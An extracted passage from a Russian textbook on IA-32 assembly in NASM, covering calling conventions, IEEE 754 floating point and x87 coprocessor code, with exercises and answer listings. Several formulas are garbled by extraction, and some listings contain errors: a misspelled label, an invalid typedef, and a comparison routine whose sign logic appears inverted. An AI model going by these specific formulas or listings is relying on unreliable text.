     EBP, переменная v, оставшийся на стеке аргумент вызова 9000. Поместив тремя ко-
     мандами PUSH аргументы вызова printf, получим фрейм размером в 32 байта.




68
  extern printf

  section .rodata
   .LC0 db `Pair (%d, %d)\n`, 0

  section .text
  g:
     push    ebp                  ; Первые две команды – стандартный пролог
     mov     ebp, esp
     sub     esp, 8             ; Выделяем 8 байт для pair v
     push    9000               ; Кладем второй аргумент функции f – treshold
     push    dword [ebp+8]      ; Кладем первый аргумент функции f - p
     lea     eax, [ebp-8]       ; Вычисляем адрес переменной v и кладем его на
     push    eax                ; стек в качестве неявного аргумента
     call    f
     add     esp, 4               ; Освобождаем одно двойное слово на стеке
     push    dword [ebp-4]        ; Кладем на стек три аргумента вызова printf
     push    dword [ebp-8]
     push    .LC0
     call    printf
     leave                        ; Эпилог
     ret


Задачи

Задача 4-1
Для работы с однонаправленным списком без заглавного звена используется объ-
явление:

  typedef struct t_listnode{
     short key;
     struct t_listnode *next;
  } listnode;



Учитывая, что для вывода значений, а также для работы с динамической памятью
используются функции стандартной библиотеки языка Си, реализовать следующие
функции:

  1) void printlist(listnode *p);
     Печать ключей из звеньев списка p.
  2) listnode * addhead(listnode *p, short n);
     Добавление нового звена с ключом n в голову списка p, возвращается указа-
     тель на головное звено списка.
  3) listnode * dellast(listnode *p);
     Удаление последнего звена из непустого списка p с освобождением занятой
     им памятью, возвращается указатель на головное звено списка.

При реализации рассмотреть два случая:



                                                                                 69
        а) реализация удовлетворяет соглашению cdecl;
        б) реализация удовлетворяет соглашению fastcall.

     Задача 4-2
     Для работы с двоичным деревом используется объявление:

       typedef struct t_treenode {
          short key;
          struct t_treenode *left, *right;
       } treenode;



     Учитывая, что для вывода значений, а также для работы с динамической памятью
     используются функции стандартной библиотеки языка Си, рекурсивно реализовать
     следующие функции:

        1) int eq(treenode *t1, treenode *t2);
           Проверка на равенство деревьев t1 и t2, в случае равенства возвращается
           значение 1, и 0 в противном случае.
        2) treenode * insert(treenode *t, short n);
           Вставка новой вершины с ключом n в дерево поиска t, возвращается указа-
           тель на корень дерева.
        3) void deltree(treenode *t);
           Удаление дерева с освобождением занятой им памятью.

     При реализации рассмотреть два случая:

        а) реализация удовлетворяет соглашению cdecl;
        б) реализация удовлетворяет соглашению fastcall.

     Задача 4-3
     Пусть имеются две функции с одинаковыми прототипами:

        1) int wrapper(int a, int b, int c), int actual(int a, int b, int c) ;
        2) struct pair wrapper(struct pair *a, int x, int y) , struct pair actual(struct
           pair *a, int x, int y), где struct pair содержит два поля int n и int m.

     Реализуйте на языке ассемблера функцию wrapper, которая должна вызвать actual с
     идентичным собственному набором параметров и вернуть полученное значение.
     При этом:

        а) и wrapper, и actual используют соглашение cdecl;
        б) и wrapper, и actual используют соглашение fastcall;
        в) и wrapper, и actual используют соглашение stdcall;
        г) wrapper использует соглашение cdecl, а actual – stdcall;


70
  д) wrapper использует соглашение stdcall, а actual – cdecl;
  е) то же, что в пункте г), но используется ключ -fomit-frame-pointer;
  ж) то же, что в пункте д), но используется ключ -fomit-frame-pointer.

Задача 4-4
Реализуйте следующую функцию на языке ассемблера. Обратите внимание на то,
что возвращаемую структуру можно целиком упаковать в регистр EAX.

   struct result {
      short count;
      short min;
   };

   struct result f(short n, short x[n])
   {
      struct result ret = { 0, 0 };

       for (short i = 0; i < n; ++i) {
          if (ret.min == x[i] && ret.count) {
             ++ret.count;
          } else if (ret.min > x[i] || !ret.count) {
             ret.min = x[i];
             ret.count = 1;
          }
       }

       return ret;
   }




                                                                          71
     5. Сопроцессор x87 и обработка чисел с плавающей
     точкой
     Представление вещественных чисел – числа с плавающей точкой
     Для работы с вещественными числами используется представление с плавающей
     точкой. Число представляется в виде произведения трех множителей (1) S  M  2E .
     Степень S определяет, является число положительным или отрицательным. Ман-
     тисса M – дробное двоичное число в заданном полуинтервале. В стандарте IEEE 754,
     задающего правила работы с числами с плавающей точкой, используются полуин-
     тервалы: [1.0, 2.0) для нормализованных чисел и [0.0, 1.0) для денормализован-
     ных. Порядок E определяет степень 2 в третьем множителе.

     Для представления числа в машине необходимо определить правила кодирования
     этих трех величин. Стандарт IEEE 754 задает следующий формат:




     Наибольший значащий бит S непосредственно кодирует знак числа. Поле EXP коди-
     рует порядок числа E. Поле FRAC кодирует мантиссу M. Количество битов, выделяе-
     мых для кодировки мантиссы и порядка, определяют тип данных (Таблица ???) и
     характеризуют точность представления чисел.

     Таблица 4. Размеры полей для некоторых типов данных .

                            Тип         Размер      Знак S      Мантисса M Порядок E
     Одинарная точность     float       32 бита     1           23          8
     Двойная точность       double      64 бита     1           52          11
     Расширенная точность               80 битов    1           64          15


     Типы float и double определены в стандарте языка Си, расширенная точность реа-
     лизована в аппаратуре архитектуры IA-32.

     Число получает нормализованное представление в заданном типе данных, если
     размеров полей хватает для кодировки S, M и E по следующим правилам.

     Пусть для кодировки порядка имеется k битов. В поле EXP кодируется целое число
     E  bias, где bias  2k 1  1 . Поле EXP не может содержать одни нули или единицы.
     При этом мантисса должна принадлежать полуинтервалу [1.0, 2.0). В поле FRAC
     пишется последовательность битов, кодирующая дробную часть мантиссы (т. е. ве-



72
дущая 1 отбрасывается). Если мантисса является периодической двоичной дробью,
то при выделении битов, помещаемых в поле FRAC, происходит округление.

Если число слишком мало (по модулю), оно представляется в денормализованном
виде. Поле EXP заполняется нулями, порядок E принимается равным 1  bias, а ман-
тисса должна в этом случае принадлежать полуинтервалу [0.0, 1.0). В поле FRAC
пишется последовательность битов, кодирующая дробную часть мантиссы (т. е. ве-
дущий 0 отбрасывается). При необходимости выполнятся округление.

Для подавления ошибок округления стандарт IEEE 754 предлагает округление к
ближайшему четному числу. В случае если из двоичной дроби отбрасывается одна
единица, то округляют к тому числу, у которого наименьшая значащая цифра чет-
ная, т. е. 0.

Пример 5-1 Перевод числа в модельную кодировку
Используется 10-битный формат, удовлетворяющий требованиям стандарта
IEEE 754: знаковый бит, 4 бита – порядок, 5 битов – мантисса. Требуется предста-
вить в данном формате числа -⅕ и 105.

                                                Решение

             8                                 8
 1  (1)1   2 3 , таким образом S = 1, M = , E = -3. Поскольку для кодировки
   5         5                                 5
порядка выделено 4 бита bias  241  1  7 , а EXP = -3 + bias|7 = 4 = 01002.

                8
Переводим         в периодическую двоичную дробь разложением по степеням двой-
                5
ки.

8          6                        2                                   4
   1 20   21  1 20  1 21   22  1 20  1 21  0  2 2   2 3 
5          5                        5                                   5

                                         8                                                          6
 1 20  1 2 1  0  2 2  0  2 3   2 4  1 20  1 2 1  0  2 2  0  2 3  1 2 4   2 5  ...
                                         5                                                          5

Собираем коэффициенты перед степенями двоек и получаем периодическую
          8
дробь:       1.100(1100) 2 . Т. к. ведущая 1 в поле FRAC кодироваться не будет, записаны
          5
будут следующие, выделенные серым цветом, биты 1.1001100(1100)2. Не вмещаю-
щаяся в поле последовательность битов 00(1100)2 меньше 1(0)2 поэтому округление
выполняется к меньшему число, т. е. к 1.100112.

Таким образом, искомая кодировка для -⅕ имеет вид 1_0100_10011.




                                                                                                             73
     Представляем 105 в виде суммы степеней двойки и переводим в двоичное пред-
     ставление 10510  64  32  8  1  11010012 . В виде трех множителей число предста-
     вится как 10510  (1)0 1.1010012  26 . EXP = 6 + bias|7 = 13 = 11012.

     В записи мантиссы последняя единица не помещается в поле FRAC, что означает
     необходимость искать ближайшее четное число. Выпишем (в порядке убывания),
     какие представимые заданной кодировкой числа окружают мантиссу.
         1.1010102

     M = 1.1010012

         1.1010002

     Как видно, после приведения к предоставленным размерам большее число оказы-
     вается оканчивающимся на 1, а меньшее – на 0. Таким образом, округляем мантис-
     су к 1.1010002 и заносим последовательность выделенных серым цветом битов в
     поле FRAC.

     Собрав все поля, получаем для числа 105 искомую кодировку 0_1101_101002.

     Сопроцессор x87
     Обработка чисел с плавающей точкой в архитектуре IA-32 выполняется либо ко-
     мандами сопроцессора x87, либо векторными командами расширений SSE, позво-
     ляющими одновременно обрабатывать несколько чисел. На момент 2014 года бы-
     ло последовательно произведено пять расширений набора команд: SSE, SSE2, SSE3,
     SSSE3, и SSE4. Современные версии компилятора GCC отдают предпочтение имен-
     но этой группе команд, как более производительной, но если пользователь (в це-
     лях совместимости с более ранними версиями процессоров) укажет в качестве це-
     левого процессора i386, в построении исполнимой программы будут использо-
     ваться команды сопроцессора x87.

     Изучение команд SSE выходит за рамки данного курса, тогда как сопроцессор x87
     реализует ряд идей, делающих его кардинально отличающимся от x86. Историче-
     ски сопроцессор был реализован отдельным кристаллом, но уже в Pentium он был
     окончательно интегрирован с основным процессором в рамках одного кристалла.
     Однако интеграция не затронула набор команд, изначально разработанный набор
     команд функционирует до сих пор. В наборе команд можно выделить подмноже-
     ство, позволяющее работать с x87 как с безадресным, стековым процессором. Ос-
     новное внимание в дальнейшем будет уделено именно этим командам.

     Сопроцессор x87 содержит 8 регистров для размещения чисел с плавающей точ-
     кой. Помимо этих регистров есть еще три служебных регистра: управляющий ре-
     гистр, регистр состояния и регистр признаков.


74
Регистры для данных организованы в виде аппаратно поддерживаемого стека. Ре-
гистр признаков содержит биты, описывающие состояние регистров данных: заня-
ты они или свободны. Изначально все восемь регистров считаются свободными.
Именование регистров меняется после того, как на верхушку стека было помещено
новое значение (команда FLD) или, наоборот, значение было извлечено (команда
FSTP). Обмен данными возможен только с памятью: на стек регистров x87 невоз-
можно поместить непосредственно закодированную в команде величину-
константу или переслать данные из регистров x86. Верхушка стека регистров име-
нуется как ST0, следующий за ним регистр – ST1 и так далее, до последнего занятого
регистра. После помещения на стек нового значения оно оказывается в ранее сво-
бодном регистре ST0, прежний регистр ST0 начинает называться ST1 и т. д.

Операции над числами, расположенными на стеке, выполняются командами, ко-
торые не содержат в себе явно закодированных операндов – неявными операнда-
ми являются значения из верхних регистров стека.

Пример 5-2 Взятие модуля числа
Требуется взять по модулю число двойной точности, расположенное в статической
памяти.

                                   Решение

Для взятия модуля воспользуемся безадресной командой FABS, а для пересылок
данных командами FLD и FSTP. Все команды x87 имеют префикс F. Суффикс P указы-
вает на то, что при выполнении команды на верхушке стеке освобождается один
регистр и все имена оставшихся регистров «сдвигаются» описанным выше обра-
зом.

  section .bss
     var resq 1        ; резервируем в статической памяти 8 байт

  section .text
     finit             ; инициализируем сопроцессор
     fld   qword [var] ; помещаем на стек регистров значение из памяти
     fabs              ; берем по модулю значение из верхнего регистра и
                       ; помещаем туда же полученный результат
     fstp qword [var] ; пересылаем в память содержимое занятого регистра
                       ; и освобождаем этот регистр



После выполнения приведенных команд состояние стека регистров вернется к
начальному состоянию – все регистры будут свободны.

Особенности кодировки чисел с плавающей точкой позволяют брать модуль без
использования x87, поразрядными битовыми командами x86.


                                                                              75
     Пример 5-3 Разность чисел
     Требуется вычислить разность двух чисел с плавающей точкой одинарной точно-
     сти. Разность необходимо расширить до двойной точности и сохранить в третьей
     переменной соответствующего размера. Все переменные расположены в статиче-
     ской памяти.

                                         Решение

     Для вычисления разности будет использована команда FSUBP, которая вычисляет
     величину ST1 – ST0. Поскольку до вычисления разности на стеке было занято два
     верхних элемента, а для размещения результата требуется всего один, в результате
     выполнения команды один элемент стека освобождается, во второй (ставший
     верхним) записывается результат.

     Другой важной особенностью x87 является то, что вычисления по умолчанию про-
     исходят в пределах расширенной точности (80 битов на число). Точность вычисле-
     ний задается в управляющем регистре и на практике не меняется после того, как
     сопроцессор был инициализирован командой FINIT. Преобразования типов проис-
     ходят в момент пересылок данных между регистрами и памятью: команды FLD и
     FSTP выполняют эти преобразования согласно явно заданным размерам операнда.
     Допустимые спецификаторы размера операндов: DWORD, QWORD, TWORD. Переменные
     размера TWORD в рассматриваемых примерах не используются; данный формат уни-
     кален для сопроцессора x87 и в других распространенных архитектурах не приме-
     няется.

       section .bss
          x resd 1           ; резервируем 4 байта для первой переменной x
          y resd 1           ; резервируем 4 байта для второй переменной y
          z resq 1           ; резервируем 8 байт для сохранения результата

       section .text
          finit              ; инициализируем сопроцессор
          fld   dword [x]    ; st0 = x
          fld   dword [y]    ; st0 = y, st1 = x
          fsubp              ; Вычисляем st1 – st0, освобождаем один регистр,
                             ; результат записываем в верхний элемент стека
          fstp   qword [z]   ; Снимаем со стека регистров x87 верхнее значение
                             ; и записываем его в переменную z



     Вычисление разности не потребовало явного задания имен регистров x87. Боль-
     шинство учебных задач, связанных с x87, можно решить именно в таком стиле.




76
Пример 5-4 Ввод и вывод чисел с плавающей точкой
Требуется ввести с клавиатуры число с плавающей точкой двойной точности, вы-
числить обратную величину и напечатать ее значение с точностью до 12 знака. Ис-
пользуйте для хранения числа автоматическую память (стек).

                                   Решение

Напрямую использовать функции ввода-вывода из учебной библиотеки для рабо-
ты с плавающей точкой не представляется возможным – поддержки плавающей
точки у них нет. Поэтому ввод-вывод будет организован через функции scanf и
printf. Использование этих функций потребует предварительно выровнять стек,
подготовить форматные строки и вычислить место на стеке, где будет размещена
переменная. Для помещения на стек регистров величины 1.0 используется специ-
альная команда FLD1. Вычисление обратной величины будет осуществлено коман-
дой FDIVP, которая делит ST1 на ST0, освобождает один регистр, а во второй регистр,
ставший верхушкой стека, помещает частное.




                                                                               77
       section .rodata
          input_fmt db `%lf`, 0      ; Вводим 8-ми байтовое число с плавающей точкой
          output_fmt db `%.12f\n`, 0 ; Требуем вывести 12 знаков после точки

       extern scanf
       extern printf

       section .text
       global main
       main:
          mov ecx, esp
          and esp, 0xfffffff0
          push ecx
          sub esp, 28            ; 12 байт не хватает для размещения во фрейме
                                 ; переменной и аргументов вызова– добавляем еще 16
          lea   eax, [esp+20]    ; esp+20 – адрес, по которому будет размещено
                                 ; веденное число. Для хранения числа потребуется
                                 ; 8 байт.
          mov [esp+4], eax
          mov dword [esp], input_fmt
          call scanf
          cmp eax, 1
          jne .epilog           ; Ничего не было введено

          finit
          fld1                   ; Поместили на стек регистров 1.0
          fld qword [esp+20]     ; Поместили на стек регистров введенное число
          fdivp                  ; Поделили 1.0 на введенное число
          fstp qword [esp+20]    ; Выгрузили обратную величину в память

          mov eax, [esp+20]     ; Копируем вычисленную величину в пространство
          mov [esp+4], eax      ; аргументов. Поскольку число состоит из 8 байт
          mov eax, [esp+24]     ; копируем его двумя частями по 4 байта каждый
          mov [esp+8], eax
          mov dword [esp], output_fmt
          call printf

        .epilog:
          add esp, 28            ; восстанавливаем исходное состояние стека
          pop ecx
          mov esp, ecx
          xor eax, eax
          ret



     Пример 5-5 Сравнение чисел с плавающей точкой
     Реализовать функцию int cmp(double a, double b), возвращающую 1, если a больше
     b, -1, если b больше a, и 0, если параметры равны.

                                        Решение

     Сравнение чисел с плавающей точкой можно провести двумя способами.

     Первый способ предполагает использование команды FUCOMPP, которая изначально
     присутствовала в x87. Результаты ее работы запоминаются в регистре состояния
     x87 и не могут быть сразу же использованы для изменения порядка выполнения


78
команд. Для этого необходимо последовательно передать состояние в регистр AX
(команда FNSTSW AX), а затем переслать старший байт в EFLAGS (команда SAHF). В ито-
ге биты, показывающие результаты сравнения, окажутся помещенными в ZF и CF,
что позволяет использовать коды условий для беззнаковых чисел. Для практиче-
ского кодирования такой способ сравнения относительно неудобен, поскольку
приходится запоминать мнемоники крайне редко используемых команд. Положи-
тельной стороной является то, что команда FUCOMPP после сравнения освобождает
оба регистра (на что указывает суффикс PP), приводя стек регистров к первоначаль-
ному состоянию. Следует отметить, что существуют две другие разновидности ко-
манды сравнения: с одним суффиксом P FUCOMP и без суффикса FUCOM.
Второй способ использует команду FUCOMIP STi (FUCOMI STi), которая появилась
только в Pentium Pro. Команда сравнивает ST0 с явно заданным операндом-
регистром и сразу же помещает результаты в ZF и CF. Неудобство вызывает то, что
нет возможности сразу очистить оба сравниваемых регистра. Ниже приведено ре-
шение на основе второго способа.
   section .text
   cmp:
      push   ebp              ; Стандартный пролог для соглашения cdecl
      mov    ebp, esp

      xor    eax, eax         ; Предварительно обнуляем возвращаемое значение
      fld    qword [ebp+16]   ; Помещаем на стек второй параметр b
      fld    qword [ebp+8]    ; Помещаем на стек первый параметр a
      fucomi st1              ; Сравниваем st0|a vs. st1|b
                              ; Результаты сравнения сразу попадают в ZF и CF
      finit                   ; Через инициализацию очищаем стек регистров

      setb    al              ; Если a больше b, помещаем в al 1
      jbe     .1              ; Только если a меньше b …
      mov     al, 0xff        ; … помещаем в al -1
    .1:
      movsx   eax, al         ; Расширяем al до всего регистра eax

      pop     ebp
      ret



Пример 5-6 Вычисление площади треугольника
Реализовать функцию double herons(double a, double b, double c), вычисляющую
площадь треугольника по формуле Герона.

                                     Решение

Условие задачи требует реализации вычисления по формуле              s( s  a)(s  b)(s  c) ,
          abc
где s          . Сначала вычислим полупериметр s, а затем будем использовать
            2
это значение для вычисления остальных подкоренных множителей. Согласно тре-
бованиям соглашения cdecl, возвращаемое значение должно остаться в ST0,
остальные регистры данных x87 должны быть свободными.


                                                                                         79
       section .rodata
          float_two dd 2.0         ; 2.0 потребуется для вычисления полупериметра

       section .text
       herons:
          push   ebp               ; Стандартный пролог для соглашения cdecl
          mov    ebp, esp
          sub    esp, 8            ; Выделяем место для хранения полупериметра

          fld     qword [ebp+8]
          fld     qword [ebp+16]
          fld     qword [ebp+24]   ; Загрузили на стек регистров все три параметра
          faddp
          faddp                   ; Сложили параметры и получили периметр
          fld     dword [float_two]
          fdivp                   ; Поделили на 2.0 – получили полупериметр s
          fst     qword [esp]     ; Сохранили полупериметр в памяти, не освобождая
                                  ; регистр st0 – он будет использоваться при
                                  ; вычислении подкоренного произведения
          fld     qword [esp]     ; Загрузили s
          fld     qword [ebp+8]   ; Загрузили a
          fsubp                   ; Вычислили второй множитель (s-a)
          fld     qword [esp]
          fld     qword [ebp+16]
          fsubp                   ; Вычислили третий множитель (s-b)
          fld     qword [esp]
          fld     qword [ebp+24]
          fsubp                   ; Вычислили четвертый множитель (s-c)
          fmulp
          fmulp
          fmulp                    ; Все перемножили и …
          fsqrt                    ; … взяли корень. Результат остался в st0,
                                   ; все остальные регистры данных x87 свободны.
          add     esp, 8
          pop     ebp
          ret




     Задачи

     Задача 5-1 Перевод числа в модельную кодировку
     Используется 9-битный формат, удовлетворяющий требованиям стандарта
     IEEE 754: знаковый бит, 4 бита – порядок, 4 бита - мантисса. Требуется представить
     в данном формате числа ⅚ и -89.

     Задача 5-2 Вычисление длины окружности
     На стандартный вход подается число в экспоненциальной форме записи, задающее
     длину радиуса окружности. Требуется вычислить длину окружности и напечатать
     ее на стандартный вывод с точностью три десятичных знака после запятой.

     Замечание: допустимо оформлять программу в виде отдельной функции, выпол-
     няющейся на уже выровненном стеке.

80
Задача 5-3 Приближение Чебышева
Требуется вычислить расстояние между двумя точками на плоскости, используя
приближение Чебышева вместо дорогостоящей операции взятия квадратного кор-
ня.

  sqrt(dx^2 + dy^2) = max(|dx|, |dy|) + 0.35 * min(|dx|, |dy|)


Ответ напечатайте на стандартный вывод, входом программ являются непосред-
ственно dx и dy.
Задача 5-4 Теорема синусов
Требуется рассчитать длину одной из сторон треугольника по длине другой сторо-
                                    sin  sin 
ны и синусам противолежащих углов:             .
                                        a      b

Ниже дан фрагмент программы, которая выполняет ввод данных, требуемые вы-
числения и вывод результата.

Дополните приведенный текст:

   1) реализуйте функцию lawOfSin,
   2) обеспечьте ее вызов из функции main.

Дополнительные требования к реализации:
  1. Функция lawOfSin соответствует объявлению
      void lawOfSin(float a, float alpha, float beta).
   2. Печатается результат вычислений с одинарной точностью.
   3. Для печати используется функция printf, что дополнительно требует долж-
      ного выравнивания стека.




                                                                          81
       section .rodata
       fmt1 db 'a=%f alpha=%f beta=%f', 0

       extern scanf

       section .text
       global main
       main:
          push ebp
          mov ecx, esp
          and esp, 0xfffffff0
          sub esp, 32
          mov [esp+28], ecx

          mov dword [esp], fmt1
          lea eax, [esp+24] ; &a
          mov [esp+4], eax
          lea eax, [esp+20] ; &alpha
          mov [esp+8], eax
          lea eax, [esp+16] ; &beta
          mov [esp+12], eax
          call scanf

          ; подготовка фактических аргументов
          ; ...
          call lawOfSin

          mov ecx, [esp+28]
          mov esp, ecx
          pop ebp
          xor eax, eax
          ret

       lawOfSin:
          ; тело функции
          ret



     Задача 5-5 Из полярных – в декартовы
     Даны полярные координаты точки на плоскости, требуется перевести их в декарто-
     вы координаты. Реализуйте преобразование в виде функции, удовлетворяющей
     следующему объявлению на языке Си и гибридному соглашению вызова cdecl
     компилятора GCC.

       typedef struct {
          double x;
          double y;
       } 2DPoint;

       typedef 2DPoint C_Point;
       typedef 2DPoint P_Point;

       D_Point fromPolarToCartesian(C_Point);




82
Более сложная версия этой задачи – обратное преобразование, из декартовых в
полярные координаты.

Задача 5-6 Параллельное соединение
n сопротивлений подключены параллельно в электрическую цепь. Требуется рас-
                                                     1 1   1         1
считать их суммарное сопротивление R по формуле             ...     .
                                                     R R1 R2         Rn

Реализуйте вычисление в виде функции, удовлетворяющей следующему объявле-
нию на языке Си.

  double parallelCircuitResistor(int n, double resistors[n]);



Задача 5-7
Пусть задан массив вещественных чисел с плавающей точкой, которые необходи-
мо просуммировать. Зависит ли получаемый результат от порядка суммирования?
Если да, то какой порядок суммирования позволяет получить наиболее точный ре-
зультат?

Задача 5-8
Реализуйте функцию, вычисляющую скалярное произведение двух векторов, удо-
влетворяющую следующему объявлению на языке Си.

   double dot(int n, double v[n], double u[n]);


Задача 5-9
Реализуйте функцию, вычисляющую результат перемножения двух матриц, удо-
влетворяющую следующему объявлению на языке Си.

   void mult(int n, int m, int k, double a[n][m], double b[m][k], double r[n][k]);


Задача 5-10
Даны следующие определения переменных на языке Си.

   short s;
   int i;
   long long ll;


Какие из последующих выражений верны при любых начальных значениях пере-
менных?

  1) s == (short) (float) s,
  2) s == (short) (double) s,
  3) i == (int) (float) i,

                                                                                 83
     4) i == (int) (double) i,
     5) ll == (long long) (float) ll,
     6) ll == (long long) (double) ll.




84
Ответы и решения
Задача 1-1
Приведенные ниже и в задаче 1-2 решения используют строковые инструкции IA-
32. В данном пособии они не рассматриваются, ознакомиться с этой группой ин-
струкций можно, например, в работе [6].

     cld                                    ; просмотр в прямом порядке

     mov           esi, A                   ; загружаем адрес массива A
     mov           edi, B                   ; загружаем адрес массива B

     mov           ecx, 100                 ; устанавливаем число повторов

   .1:
     lodsw                                  ; теперь в ax очередное слово из a
     movsx         eax, ax                  ; расширение (альтернатива: cwde)
     stosd                                  ; записываем двойное слово в b

     loop         .1                       ; продолжаем цикл



Задача 1-2

     std                              ; просмотр в обратном порядке
     mov     ecx, dword [N]           ; считываем количество элементов
     lea     esi, [A + 2 * ecx - 2]   ; указатель на последний элемент типа
                                      ; слово
     lea     edi, [A + 4 * ecx - 4]   ; указатель на последний элемент типа
                                      ; двойное слово
     jecxz .2                         ; пропускаем цикл, если элементов нет
   .1:
     lodsw                            ; теперь в ax очередное слово из a
     movsx eax, ax                    ; расширение (альтернатива: cwde)
     stosd                            ; записываем двойное слово
     loop .1                          ; продолжаем цикл
   .2:




                                                                                 85
     Задача 1-3

       section .bss
          N equ …
          a resd N

       section .text
       global main
       main:
          mov eax, 0                 ; (1)
          mov ecx, 0                 ; (2)
          mov ebx, 4 * (N - 1)       ; (3)
        .loop:
          mov edx, dword [a + ebx]   ; (4)
          cmp edx, dword [a + ecx]   ; (5)
          je .l1                     ; (6)
          mov eax, 1                 ; (7)
          jmp .lool_end              ; (8)
        .l1:
          add ecx, 4                 ; (9)
          sub ebx, 4                 ; (10)
          cmp ecx, ebx               ; (11)
          jl .loop                   ; (12)
        .loop_end:
          ret                        ; (13)


     Задача 1-10

       mov eax, dword [i] ; Можно считать, что i и j из Си-программы соответствуют
       mov ebx, dword [j] ; статические переменные, расположенные в секции .data
       imul ecx, eax, M
       add ecx, ebx
       mov edx, dword [A + 4 * ecx]




86
Задача 1-11

  extern io_print_dec, io_newline

  section .bss
     N equ ... ; Вместо многоточия некоторая константа
     A resd N * N

  section .text
  global main
  main:
     ; этот блок кода с инициализацией матрицы необязателен
     mov ecx, N * N
  .init:
     mov dword [A + 4 * ecx - 4], ecx
     loop .init

     xor eax, eax
     xor ecx, ecx
  .loop:
     cmp ecx, N
     jge .exit
     imul ebx, ecx, N + 1 ; это вместо
                          ; imul ebx, ecx, N
                          ; add ebx, ecx
     mov edx, dword [A + 4 * ebx]
     test edx, 1
     jz   .even
     add eax, edx
  .even:
     inc ecx
     jmp .loop
  .exit:
     call io_print_dec
     call io_newline
     xor eax, eax
     ret




                                                              87
     Задача 3-3

       extern io_get_dec, io_print_dec, io_newline

       section .text
       global main
       main:
          push ebp
          mov ebp, esp
          sub esp, 8
          call io_get_dec      ; input a
          mov dword [esp], eax
          call io_get_dec      ; input b
          mov dword [esp + 4], eax
          call max
          call io_print_dec
          call io_newline
          xor eax, eax
          add esp, 8
          pop ebp
          ret

       max:
          push ebp
          mov ebp, esp
          mov eax, dword [ebp + 8] ; get a
          cmp eax, dword [ebp + 12] ; a vs. b
          cmovl eax, dword [ebp + 12] ; if a < b eax = b
          pop ebp
          ret


     Другой вариант функции max – без создания нового фрейма:

       max:
          mov eax, dword [esp + 4]   ; Извлекаем a
          cmp eax, dword [esp + 8]   ; a vs. b
          cmovl eax, dword [esp + 8] ; if a < b eax = b
          ret



     Задача 3-4
     В предложенном ниже решении используются инструкции PUSH/POP для пересылки
     данных.




88
  extern io_get_dec, io_print_dec, io_newline

  section .text
  global main
  main:
     push ebp
     mov ebp, esp
     sub esp, 16
     call io_get_dec           ; input a
     mov dword [esp + 8], eax
     call io_get_dec           ; input b
     mov dword [esp + 12], eax
     lea eax, [esp + 8]
     mov dword [esp], eax
     lea eax, [esp + 12]       ; add eax, 4
     mov dword [esp + 4], eax
     call swap
     mov eax, dword [esp + 8] ; print a
     call io_print_dec
     call io_newline
     mov eax, dword [esp + 12] ; print b
     call io_print_dec
     call io_newline
     xor eax, eax
     add esp, 16
     pop ebp
     ret

  swap:
     push ebp
     mov ebp, esp
     mov eax, dword [ebp + 8] ; get a
     mov edx, dword [ebp + 12] ; get b
     push dword [eax]          ; push *a
     push dword [edx]          ; push *b
     pop dword [eax]           ; *a <- *b
     pop dword [edx]           ; *b <- *a
     pop ebp
     ret



Задача 3-5

  int f(signed char a, signed char d, int *p, int x);




                                                        89
     Задача 3-8

       extern io_get_dec, io_print_dec, io_newline

       section .text
       global main
       main:
           sub esp, 4
           call io_get_dec
           mov dword [esp], eax
           call fact
           call io_print_dec
           call io_newline
           xor eax, eax
           add esp, 4
           ret

       fact:
           push ebp
           mov ebp, esp
           sub esp, 4
           mov edx, dword [ebp + 8]
           cmp edx, 1
           jg .L1
           mov eax, 1
           jmp .L2
        .L1:
           dec edx
           mov dword [esp], edx
           call fact
           imul eax, dword [ebp + 8]
        .L2:
           add esp, 4
           pop ebp
           ret



     Допустимо слегка усложнить задачу, потребовав проверку на переполнение. В
     этом случае программа может выглядеть следующим образом.




90
  extern io_get_dec, io_print_dec, io_newline, io_print_string

  section .bss
     overflow resd 1

  section .rodata
     err_overflow db `overflow detected\0`

  section .text
  global main
  main:
      sub esp, 4
      call io_get_dec
      mov dword [esp], eax
      call fact
      cmp dword [overflow], 0
      jne .L1
      call io_print_dec
      jmp .L2
   .L1:
      mov eax, err_overflow
      call io_print_string
   .L2:
      call io_newline
      xor eax, eax
      add esp, 4
      ret

  fact:
      push ebp
      mov ebp, esp
      sub esp, 4
      mov edx, dword [ebp + 8]
      cmp edx, 1
      jg .L1
      mov eax, 1
      jmp .L2
   .L1:
      dec edx
      mov dword [esp], edx
      call fact
      imul eax, dword [ebp + 8]
      jno .L2
      mov dword [overflow], 1
   .L2:
      add esp, 4
      pop ebp
      ret




Однако в этом случае более интересным вариантом было бы вычислить факториал
«в обратную сторону», т. е. от меньшего к большему, обрывая рекурсию сразу, как
только текущий результат перестает помещаться в 32 разряда.




                                                                           91
     Задача 3-10

       global main
       main:
          lea      ecx, [esp+4]          ; Положили в ecx указатель на первый параметр
          and      esp, -16              ; Выровняли стек, спустившись "вниз"
          push     dword [ecx-4]         ; Скопировали адрес возврата
          push     ebp                   ; Сохранили ebp и ...
          mov      ebp, esp              ; переместили его на новое место
          push     ecx                   ; Сохранили ecx и ...
          sub      esp, 20               ; заказали оставшуюся часть фрейма.
                                         ; Т.к. выравнивание начинается с адреса
                                         ; возврата, то уже израсходовано
                                         ; 12 байт = адрес возврата + ecx + ebp
                                         ; Заказываем 20 байт, чтоб получилось два
                                         ; блока по 16
                                         ; Далее свободно работаем с имеющимся
                                         ; пространством фрейма
           mov      eax, dword [ecx+4]   ; Копируем параметры в низ фрейма
           mov      dword [esp+4], eax
           mov      eax, dword [ecx]
           mov      dword [esp], eax     ; дабы вызвать какую-нибудь функцию
       ;     call   ...
           mov      eax, 0
           add      esp, 20              ; Возвращаем указатель фрейма на место
           pop      ecx                  ; Восстанавливаем регистры
           pop      ebp
           lea      esp, [ecx-4]         ; Ставим указатель стека на исходную позицию
           ret




92
Задача 3-11

  section .text
  global main
  extern time
  extern ctime
  extern puts

  main:
     lea      ecx, [esp+4]
     and      esp, -16
     push     dword [ecx-4]
     push     ebp
     mov      ebp, esp
     push     ecx
     sub      esp, 20
     mov      dword [esp], 0
     call     time
     mov      dword [ebp-8], eax
     lea      eax, [ebp-8]
     mov      dword [esp], eax
     call     ctime
     mov      dword [esp], eax
     call     puts
     mov      eax, 0
     add      esp, 20
     pop      ecx
     pop      ebp
     lea      esp, [ecx-4]
     ret



Задача 3-12

  memcpy:
     push         ebp                     ; стандартный пролог
     mov          ebp, esp

     push         esi                     ; сохраняем esi и edi,
                                          ; т.к. они нам понадобятся
     push         edi

     mov          edi, dword [ebp + 8]    ; edi := destination
     mov          esi, dword [ebp + 12]   ; esi := source
     mov          ecx, dword [ebp + 16]   ; ecx := num

     mov          eax, edi                ; должны вернуть destination

     cld                                  ; сбрасываем df
     rep          movsb                   ; копируем побайтово
